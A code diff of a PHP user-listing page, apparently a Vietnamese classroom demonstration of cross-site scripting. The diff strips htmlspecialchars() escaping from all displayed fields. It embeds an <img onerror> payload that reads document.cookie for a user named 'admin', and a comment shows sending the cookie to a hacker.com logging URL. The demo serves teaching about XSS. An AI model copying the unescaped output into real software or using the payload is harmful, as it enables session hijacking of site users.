@@ -27,7 +27,7 @@ $users = $userModel->getUsers($params);
 <div class="container">
     <?php if (!empty($users)) {?>
         <div class="alert alert-danger" role="alert">
-            DEMO TẤN CÔNG XSS: Chạy mã độc để đánh cắp dữ liệu.
+            **CHÚ Ý:LỖ HỔNG XSS!** <br> Mã độc sẽ được kích hoạt nếu có người dùng tên 'admin'.
         </div>
         <table class="table table-striped">
             <thead>
@@ -42,53 +42,50 @@ $users = $userModel->getUsers($params);
             <tbody>
             <?php foreach ($users as $user) {?>
                 <tr>
-                    <!-- Áp dụng htmlspecialchars() cho mọi dữ liệu hiển thị -->
-                    <th scope="row"><?php echo htmlspecialchars($user['id'])?></th>
+                    <th scope="row"><?php echo $user['id']?></th>
                     <td>
                         <?php
                         $malicious_name = $user['name'];
                         if ($user['name'] == 'admin') {
-                            // MÃ ĐỘC MỚI: Lấy cookie và hiển thị nó trong thẻ <img>.
-                            // Kẻ tấn công sẽ thay thế <img src=...> bằng yêu cầu gửi đến máy chủ của họ.
+                            // Dữ liệu ĐỘC HẠI được giả lập lấy từ database.
+                            // Payload XSS phức tạp để lấy và hiển thị cookie lên trang.
                             $malicious_name = "Admin 
                                 <img src=x onerror='
                                     var stolenCookie = document.cookie;
-                                    var victimUsername = \"admin\"; // Giả định
                                     var displayDiv = document.createElement(\"div\");
                                     
-                                    // Tạo giao diện cảnh báo để thầy bạn thấy rõ
+                                    // giao diện cảnh báo rõ cookie bị đánh cắp
                                     displayDiv.innerHTML = \"<hr><b style=\\\"color:red;\\\">[ĐÃ BỊ TẤN CÔNG] Cookie bị đánh cắp: </b>\" + stolenCookie;
-                                    displayDiv.style.border = \"2px solid red\";
-                                    displayDiv.style.padding = \"10px\";
-                                    displayDiv.style.marginTop = \"10px\";
+                                    displayDiv.style.backgroundColor = \"#ffe0e0\";
+                                    displayDiv.style.border = \"3px dashed red\";
+                                    displayDiv.style.padding = \"15px\";
+                                    displayDiv.style.marginTop = \"20px\";
+                                    displayDiv.style.fontSize = \"16px\";
                                     
-                                    // Chèn cảnh báo vào đầu body của trang
+                                    // Chèn cảnh báo vào đầu body của trang để nó luôn hiển thị
                                     document.body.insertBefore(displayDiv, document.body.firstChild);
                                     
-                                    // Thay vì hiển thị, kẻ tấn công sẽ gửi nó đến máy chủ của họ.
-                                    // Ví dụ: new Image().src=\"http://hacker.com/log.php?c=\" + stolenCookie;
+                                    // Kẻ tấn công thực tế sẽ dùng: new Image().src=\"http://hacker.com/log.php?c=\" + stolenCookie;
                                 '>";
-
                         }
-                        // LỖ HỔNG: In chuỗi mã độc trực tiếp ra HTML
+                        // LỖ HỔNG XSS: In chuỗi mã độc trực tiếp ra HTML mà KHÔNG LỌC
                         echo $malicious_name;
                         ?>
                     </td>
-                        
                     <td>
-                        <?php echo htmlspecialchars($user['fullname'])?>
+                        <?php echo $user['fullname']?>
                     </td>
                     <td>
-                        <?php echo htmlspecialchars($user['type'])?>
+                        <?php echo $user['type']?>
                     </td>
                     <td>
-                        <a href="form_user.php?id=<?php echo htmlspecialchars($user['id']) ?>">
+                        <a href="form_user.php?id=<?php echo $user['id'] ?>">
                             <i class="fa fa-pencil-square-o" aria-hidden="true" title="Update"></i>
                         </a>
-                        <a href="view_user.php?id=<?php echo htmlspecialchars($user['id']) ?>">
+                        <a href="view_user.php?id=<?php echo $user['id'] ?>">
                             <i class="fa fa-eye" aria-hidden="true" title="View"></i>
                         </a>
-                        <a href="delete_user.php?id=<?php echo htmlspecialchars($user['id']) ?>">
+                        <a href="delete_user.php?id=<?php echo $user['id'] ?>">
                             <i class="fa fa-eraser" aria-hidden="true" title="Delete"></i>
                         </a>
                     </td>
